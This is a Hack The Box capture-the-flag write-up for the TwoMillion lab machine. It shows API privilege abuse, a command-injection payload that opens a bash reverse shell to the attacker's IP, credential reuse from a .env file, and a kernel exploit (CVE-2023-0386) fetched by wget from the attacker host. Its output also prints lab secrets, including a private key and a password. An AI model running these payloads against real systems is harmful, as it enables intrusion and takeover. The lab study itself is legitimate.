### Hack The Box Writeup: Two Million

## Overview

- **Machine Name**: TWo Million
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: May 2025

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell. 

## Tools Used

- **Enumeration**: Nmap
- **Exploitation**: Python
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
ping -c 1 10.10.11.221

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.221 -oG allPorts
nmap -sCV -p22,80 10.10.11.221 -oN targeted

# Put 2million.htb in hosts
nvim /etc/hosts send(IP(src="192.168.1.13", dst="192.168.1.1")/ICMP()/"Hello World")

# wen scan
nmap --script http-enum -p80 10.10.11.221 -oN webScan

# using scapy to do -sS
pip3 install scapy --break-system-packages
pip3 install pwn --break-system-packages

# sniffing
tshark -i tun0 2>/dev/null
nmap -p22 -sT 10.10.11.221

# Threeway handshake
   13 13.058773460  10.10.15.66 → 10.10.11.221 TCP 60 34576 → 22 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=1998777240 TSecr=0 WS=128
   14 13.128092733 10.10.11.221 → 10.10.15.66  TCP 60 22 → 34576 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1362 SACK_PERM TSval=3492652545 TSecr=1998777240 WS=128
   15 13.128116349  10.10.15.66 → 10.10.11.221 TCP 52 34576 → 22 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1998777309 TSecr=3492652545
   16 13.128168455  10.10.15.66 → 10.10.11.221 TCP 52 34576 → 22 [RST, ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1998777309 TSecr=3492652545

```
![alt text](image.png)

```bash
python3 scanner-py 10.10.11.221 4-6
tshark -i tun0 -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" 2>/dev/null
# ans
    1 0.000000000  10.10.15.66 → 10.10.11.221 TCP 40 45202 → 4 [SYN] Seq=0 Win=8192 Len=0
    3 0.113306294  10.10.15.66 → 10.10.11.221 TCP 40 11174 → 5 [SYN] Seq=0 Win=8192 Len=0
    5 0.213316826  10.10.15.66 → 10.10.11.221 TCP 40 16754 → 6 [SYN] Seq=0 Win=8192 Len=0

python3 scanner-py 10.10.11.221 4-50
tshark -i tun0 -Y "tcp.flags.syn == 1 and tcp.flags.ack == 1" 2>/dev/null
# ans (i know that port 22 is open)
   37 3.999016841 10.10.11.221 → 10.10.15.66  TCP 44 22 → 44583 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1362
  
```
- In console site, we have to invoke function `makeInviteCode`
![alt text](image-1.png)

```js
makeInviteCode()
undefined
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
0: 200
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
​​
data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
​​
enctype: "ROT13"
​​
<prototype>: Object { … }
​
hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
​
success: 1
​
<prototype>: Object { … }
inviteapi.min.js line 1 > eval:1:372

```

data: Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
ecntype: ROT13

- We need to use tr to decryot data and make a POST request
```bash

echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'

# ans
In order to generate the invite code, make a POST request to /api/v1/invite/generate

curl -s -X POST "http://2million.htb/api/v1/invite/generate" | jq
# ans
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "UEtFV1QtVjRWMUQtV09ET08tNzMxQkM=",
    "format": "encoded"
  }
}

echo "UEtFV1QtVjRWMUQtV09ET08tNzMxQkM=" | base64 -d
# ans
PKEWT-V4V1D-WODOO-731BC

```
- We can view all endpoints from an API:
```bash
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" | jq

# ans
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" | jq

# ans
{
  "message": false
}

curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" | jq

# ans
{
  "status": "danger",
  "message": "Invalid content type."
}

curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" | jq

# ans 
{
  "status": "danger",
  "message": "Missing parameter: email"
}

curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" -d '{"email":"edibauer@edibauer.com", "is_admin": 1}'| jq

# ans
{
  "id": 23,
  "username": "edibauer",
  "is_admin": 1
}

curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" -d '{"username":"edibauer"}'

# ans
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
MIICCgKCAgEAubFCgYwD7v+eog2KetlST8UGSjt45tKzn9HmQRJeuPYwuuGvDwKS
JknVtkjFRz8RyXcXZrT4TBGOj5MXefnrFyamLU3hJJySY/zHk5LASoP0Q0cWUX5F
GFjD/RnehHXTcRMESu0M8N5R6GXWFMSl/OiaNAvuyjezO34nABXQYsqDZNC/Kx10
XJ4SQREtYcorAxVvC039vOBNBSzAquQopBaCy9X/eH9QUcfPqE8wyjvOvyrRH0Mi
BXJtZxP35WcsW3gmdsYhvqILPBVfaEZSp0Jl97YN0ea8EExyRa9jdsQ7om3HY7w1
Q5q3HdyEM5YWBDUh+h6JqNJsMoVwtYfPRdC5+Z/uojC6OIOkd2IZVwzdZyEYJce2
MIT+8ennvtmJgZBAxIN6NCF/Cquq0ql4aLmo7iST7i8ae8i3u0OyEH5cvGqd54J0
n+fMPhorjReeD9hrxX4OeIcmQmRBOb4A6LNfY6insXYS101bKzxJrJKoCJBkJdaq
iHLs5GC+Z0IV7A5bEzPair67MiDjRP3EK6HkyF5FDdtjda5OswoJHIi+s9wubJG7
qtZvj+D+B76LxNTLUGkY8LtSGNKElkf9fiwNLGVG0rydN9ibIKFOQuc7s7F8Winw
Sv0EOvh/xkisUhn1dknwt3SPvegc0Iz10//O78MbOS4cFVqRdj2w2jMCAwEAAaNg
MF4wHQYDVR0OBBYEFHpi3R22/krI4/if+qz0FQyWui6RMB8GA1UdIwQYMBaAFHpi
3R22/krI4/if+qz0FQyWui6RMA8GA1UdEwEB/wQFMAMBAf8wCwYDVR0PBAQDAgH+
MA0GCSqGSIb3DQEBCwUAA4ICAQBv+4UixrSkYDMLX3m3Lh1/d1dLpZVDaFuDZTTN
0tvswhaatTL/SucxoFHpzbz3YrzwHXLABssWko17RgNCk5T0i+5iXKPRG5uUdpbl
8RzpZKEm5n7kIgC5amStEoFxlC/utqxEFGI/sTx+WrC+OQZ0D9yRkXNGr58vNKwh
SFd13dJDWVrzrkxXocgg9uWTiVNpd2MLzcrHK93/xIDZ1hrDzHsf9+dsx1PY3UEh
KkDscM5UUOnGh5ufyAjaRLAVd0/f8ybDU2/GNjTQKY3wunGnBGXgNFT7Dmkk9dWZ
lm3B3sMoI0jE/24Qiq+GJCK2P1T9GKqLQ3U5WJSSLbh2Sn+6eFVC5wSpHAlp0lZH
HuO4wH3SvDOKGbUgxTZO4EVcvn7ZSq1VfEDAA70MaQhZzUpe3b5WNuuzw1b+YEsK
rNfMLQEdGtugMP/mTyAhP/McpdmULIGIxkckfppiVCH+NZbBnLwf/5r8u/3PM2/v
rNcbDhP3bj7T3htiMLJC1vYpzyLIZIMe5gaiBj38SXklNhbvFqonnoRn+Y6nYGqr
vLMlFhVCUmrTO/zgqUOp4HTPvnRYVcqtKw3ljZyxJwjyslsHLOgJwGxooiTKwVwF
pjSzFm5eIlO2rgBUD2YvJJYyKla2n9O/3vvvSAN6n8SNtCgwFRYBM8FJsH8Jap2s
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jun  2 04:42:08 2025 GMT
            Not After : Jun  2 04:42:08 2026 GMT
        Subject: C=GB, ST=London, L=London, O=edibauer, CN=edibauer
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:9b:fd:11:f2:80:0d:4e:7a:93:47:16:d5:cf:fe:
                    ec:ea:04:59:57:d2:47:4d:f2:d5:5f:24:b5:ed:f8:
                    7e:bc:10:b3:d5:36:bf:1c:1d:3a:ea:11:21:5f:de:
                    59:49:eb:4e:21:39:05:33:70:96:53:99:74:1e:4e:
                    79:18:fe:6e:94:15:c3:89:02:4e:cb:43:05:2c:9a:
                    0f:73:42:f9:66:b0:90:0a:4a:6e:7e:02:1a:d7:9a:
                    e4:c4:c2:c4:97:e0:0b:c2:97:8b:84:27:61:28:93:
                    3a:8b:f2:6c:37:12:9e:c7:b7:a9:9b:c6:37:52:19:
                    82:bb:26:a7:57:37:b6:f1:61:3a:c7:39:ef:fe:49:
                    8b:86:62:dd:18:91:90:7d:2b:4d:52:de:3d:6e:cc:
                    e1:01:6a:0f:fe:02:cd:1d:0f:a0:7d:88:bb:a3:1a:
                    32:a6:a0:29:84:72:ce:c8:1c:98:d9:b8:46:bf:5a:
                    4c:f7:a8:1e:8f:ef:6d:b0:dd:b0:2a:d0:5b:c1:6d:
                    a6:b8:b8:bb:c1:63:33:a2:aa:8f:ff:34:7e:a3:ed:
                    91:c1:ca:5a:90:e5:a7:cb:a1:c0:30:d6:21:e4:07:
                    f5:2f:bf:03:0d:e0:c3:1b:c7:49:e5:73:07:d8:f1:
                    cb:ed:0a:5c:f6:55:01:67:00:0e:b6:37:10:1b:75:
                    2f:ff
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                27:B9:E8:BE:04:F5:B1:94:6F:78:5A:4F:32:8A:B2:DF:EC:FD:EC:FD
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        7c:c4:28:80:f0:01:0c:52:3f:eb:68:ef:cb:35:58:37:5d:cf:
        ba:35:6f:96:1c:2d:12:0b:ba:c8:b9:e4:17:26:fc:b8:69:0b:
        68:84:da:cb:c9:54:3b:ee:e1:78:7a:b1:6a:f6:cf:cd:bb:3a:
        2c:5f:04:92:3b:2f:83:cb:dc:ce:4b:f2:67:ec:7b:69:3e:33:
        7a:8d:3c:af:87:2c:75:7a:6b:c0:a7:c1:dd:9d:20:63:cf:30:
        4b:a7:0c:62:b3:70:7b:17:fd:4c:02:27:7c:ed:6c:d8:60:b6:
        43:3c:2a:5c:76:cd:b7:7a:61:94:6f:06:92:4a:8a:29:0e:25:
        65:8f:4c:6a:ed:d4:54:8c:12:2e:88:52:41:9d:7a:4d:e0:74:
        31:05:ea:ee:06:31:af:6c:43:6c:86:16:27:ad:b5:08:59:7e:
        45:b0:da:d7:46:cc:4a:1c:c6:1c:24:74:ea:8c:c6:70:a3:14:
        79:b4:a7:b8:bf:95:6f:42:40:65:a9:8c:6b:29:f5:8d:01:7c:
        5a:5f:44:e6:f2:4b:17:cb:72:29:b7:b6:89:3a:53:14:11:33:
        31:d4:3d:8d:a0:bc:ee:45:ca:1d:3b:f6:63:27:f0:87:b8:0e:
        b0:10:d2:1c:66:40:02:11:f5:78:0f:e8:37:1e:c2:04:43:e9:
        a2:e9:af:88:c2:43:32:da:b5:71:54:57:3f:96:00:c8:4e:53:
        f1:0b:33:e1:31:10:2e:5a:80:29:00:89:1a:3c:c6:2f:66:b6:
        47:bd:ff:c9:c5:88:6a:b0:3b:36:af:a7:cd:42:81:63:2f:54:
        15:6d:d7:f2:11:e7:62:a2:e4:57:5e:a6:54:71:34:ce:38:88:
        ec:39:c7:29:3f:ef:1e:52:2c:a6:10:46:02:8a:e1:a4:f7:b3:
        ce:37:63:d0:45:ac:83:51:08:0d:1b:88:b7:3d:a5:da:7b:d4:
        18:a8:65:44:2f:bc:ba:11:ca:c7:55:9b:8e:f7:63:8a:16:20:
        46:f2:ef:e1:d9:a2:07:f2:21:74:38:37:82:eb:0a:31:68:d0:
        74:a0:92:f7:ea:3c:9a:d3:f2:6a:45:c8:01:df:07:d8:4b:c4:
        f5:2a:8a:a1:8e:15:98:2e:45:1a:ea:ea:11:a9:62:d6:6e:f8:
        f1:ae:bb:61:d9:49:a1:d9:ea:ae:9f:80:8c:99:30:b3:0d:07:
        2e:72:17:22:74:3e:08:7e:c7:f9:82:c2:71:01:4a:3b:58:df:
        b0:2d:4e:d7:eb:23:1c:5f:d1:26:83:90:b9:4c:7c:37:9c:57:
        6b:d4:e6:41:1a:45:0f:67:fb:93:38:b1:61:0c:25:00:29:54:
        f1:d5:a2:02:2d:62:d0:11
-----BEGIN CERTIFICATE-----
MIIE4zCCAsugAwIBAgIBATANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjUwNjAyMDQ0MjA4WhcNMjYw
NjAyMDQ0MjA4WjBVMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xETAPBgNVBAoMCGVkaWJhdWVyMREwDwYDVQQDDAhlZGliYXVl
cjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJv9EfKADU56k0cW1c/+
7OoEWVfSR03y1V8kte34frwQs9U2vxwdOuoRIV/eWUnrTiE5BTNwllOZdB5OeRj+
bpQVw4kCTstDBSyaD3NC+WawkApKbn4CGtea5MTCxJfgC8KXi4QnYSiTOovybDcS
nse3qZvGN1IZgrsmp1c3tvFhOsc57/5Ji4Zi3RiRkH0rTVLePW7M4QFqD/4CzR0P
oH2Iu6MaMqagKYRyzsgcmNm4Rr9aTPeoHo/vbbDdsCrQW8Ftpri4u8FjM6Kqj/80
fqPtkcHKWpDlp8uhwDDWIeQH9S+/Aw3gwxvHSeVzB9jxy+0KXPZVAWcADrY3EBt1
L/8CAwEAAaOBiTCBhjAdBgNVHQ4EFgQUJ7novgT1sZRveFpPMoqy3+z97P0wHwYD
VR0jBBgwFoAUemLdHbb+Ssjj+J/6rPQVDJa6LpEwCQYDVR0TBAIwADALBgNVHQ8E
BAMCAf4wLAYJYIZIAYb4QgENBB8WHU9wZW5TU0wgR2VuZXJhdGVkIENlcnRpZmlj
YXRlMA0GCSqGSIb3DQEBCwUAA4ICAQB8xCiA8AEMUj/raO/LNVg3Xc+6NW+WHC0S
C7rIueQXJvy4aQtohNrLyVQ77uF4erFq9s/NuzosXwSSOy+Dy9zOS/Jn7HtpPjN6
jTyvhyx1emvAp8HdnSBjzzBLpwxis3B7F/1MAid87WzYYLZDPCpcds23emGUbwaS
SoopDiVlj0xq7dRUjBIuiFJBnXpN4HQxBeruBjGvbENshhYnrbUIWX5FsNrXRsxK
HMYcJHTqjMZwoxR5tKe4v5VvQkBlqYxrKfWNAXxaX0Tm8ksXy3Ipt7aJOlMUETMx
1D2NoLzuRcodO/ZjJ/CHuA6wENIcZkACEfV4D+g3HsIEQ+mi6a+IwkMy2rVxVFc/
lgDITlPxCzPhMRAuWoApAIkaPMYvZrZHvf/JxYhqsDs2r6fNQoFjL1QVbdfyEedi
ouRXXqZUcTTOOIjsOccpP+8eUiymEEYCiuGk97PON2PQRayDUQgNG4i3PaXae9QY
qGVEL7y6EcrHVZuO92OKFiBG8u/h2aIH8iF0ODeC6woxaNB0oJL36jya0/JqRcgB
3wfYS8T1KoqhjhWYLkUa6uoRqWLWbvjxrrth2Umh2equn4CMmTCzDQcuchcidD4I
fsf5gsJxAUo7WN+wLU7X6yMcX9Emg5C5THw3nFdr1OZBGkUPZ/uTOLFhDCUAKVTx
1aICLWLQEQ==
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCb/RHygA1OepNH
FtXP/uzqBFlX0kdN8tVfJLXt+H68ELPVNr8cHTrqESFf3llJ604hOQUzcJZTmXQe
TnkY/m6UFcOJAk7LQwUsmg9zQvlmsJAKSm5+AhrXmuTEwsSX4AvCl4uEJ2EokzqL
8mw3Ep7Ht6mbxjdSGYK7JqdXN7bxYTrHOe/+SYuGYt0YkZB9K01S3j1uzOEBag/+
As0dD6B9iLujGjKmoCmEcs7IHJjZuEa/Wkz3qB6P722w3bAq0FvBbaa4uLvBYzOi
qo//NH6j7ZHBylqQ5afLocAw1iHkB/UvvwMN4MMbx0nlcwfY8cvtClz2VQFnAA62
NxAbdS//AgMBAAECggEAATIvDYtyzqu87lob+JTNTzwKTVSU7GGUxj57UKBLpHiC
UHuzem008u9/sIL9b0YpGrMbuZm+5VQzYjoazpjA00zZa3cDkKZqZz2lKa6VR/bJ
m/KXJ0sv1oBfCa0uobV7kZnk3XYJ1ixO0hzhPIjdg82CNOoPqYb9jB7PQKlyMyaX
IL4VSCJxNbF2pcMy6poRY0Hi0bIEyZZrxfhQh5MITaFmk0icUZXQxk7lIxz27dSd
ysA14SvCYNL4TCSIrVQ372gkLBOkFcukqprU7PyTeV/+7bFI1EszwXXLyOjPD5YN
fujorT3ImO029U3BaTuCZh2a+rt2QzHO48f3Z3EpCQKBgQDWyQbjMqEiZnLl/RcK
PBt9zwrfy5bGH0znswmrogut9cDrH9fVL1IP3lZhcwWkNXUXyZK3HixxIir+gavu
MxQDgdzpiLaAQVm9XbP01aNBX0eM95Myav3V6ldgI0T+m7Jm7Cw5wDQArFuGzLC7
zXqx2O8n+YDS8+GQEbPRgJ3E+QKBgQC568BpJnsmEA5b3SYebWRilMC7VdtuYR28
2pgUi8u3GJ2uB+B/f+W72LcS5nyR6YZeaCaIJ50FhYjENKEqOH1K8E54TONT/HtY
FdcBJTxveWRmQRBtZM6TpOTejB5FeCo15Jvpk76sKr2Wgp3DAhS16EqJo7RX4+1K
H55n6srytwKBgQCXk2LC77X7euVXHVcnJ+gWzwhTi2+p/ejeEuGeOEuZxrcQt3Yv
wqdc/4FiYDP5AKjT0rMxe5/Nb1l8JrLY9T8IgpsOTCbPOE9GblxTSnld5wmtmAJP
MGZWknx7IijMrcAnFkDXuKZ6Wyh0ZvvKbWZLIFcWlOOu++GRNIz8KpIssQKBgGU7
PFUEouEitO7IB01h+trCa/6UzRnYvzxpOY1WYOGdAZ4Uo+RIW2pgoa4k2YcJRCR7
SR+xkgnDn6hVj7tRbscy+Ub/dnfwbaiUm7D/+VwpGMWkf7FQxjoV+phCaukgeLtH
cq1HyPYtf3VIQWZA5830YUF4ZWXFsRo/BR1H9qEZAoGBAL+FVzJQZ04LGsEVGWAv
XYJ1trxk40Xu7no+R2YAd79LnJqxvFaEm962VWfHR8aaBgugfUsCDmthRL7ZgdnC
VUBTK2gkva/dBcweGuwmbyzMDfV9y4VI2oRY8lKwiUWCALWoj/08/L9RYSh+RthJ
9rTACTLiuQ4XZGohho0K1Ovp
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----



```

### Exploitation
- Wen can use the same API to inject some commands
```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" -d '{"username":"test; whoami #"}'

# ans
www-data

curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" -d '{"username":"test; whoami;"}'

# ans
www-data

>

# One liner
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=7f1kk3guvu49r3ctd4e869f2a1" -H "Content-Type: application/json" -d '{"username":"test; bash -c \"bash -i >& /dev/tcp/10.10.15.66/443 0>&1\";"}'

script /dev/null -c bash
ctrl + z

stty raw -echo;fg
reset xterm
export TERM=xtemr
export SHELL=bash



```


### Privilege Escalation
```bash
cat Database.php
ls -la

# ans
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jun  2 04:50 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views

cat .env

# ans
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

su admin
# SuperDuperPass123

cd admin
cat user.txt
# f3689b0d721cc57120f04d2996bda6f7

ssh admin@10.10.11.221
# SuperDuperPass123

find / -perm -4000 2>/dev/null

uname -a # kernel version

find / -user admin 2>/dev/null | grep -vE "sys|proc" | grep var

# ans
/var/mail/admin

cat /var/mail/admin

# ans
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

https://github.com/sxlmnwb/CVE-2023-0386 # OverlayFS / FUSE privilege escalation

zip comprimido.zip -r CVE-2023-0386
python3 -m http.server 80

cd /tmp # vicitms machine
wget http://10.10.15.66/comprimido.zip

unzip comprimido.zip
cd CVE

make all
./fuse ./ovlcap/lower ./gc

.exp/ # in another terminal

# ans
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun  2 05:23 .
drwxr-xr-x 6 root   root     4096 Jun  2 05:21 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.




```


## Challenges Faced


## Lessons Learned



## References



---

*Written by edibuaer, 06 2025. Feedback welcome at https://github.com/edibauer.*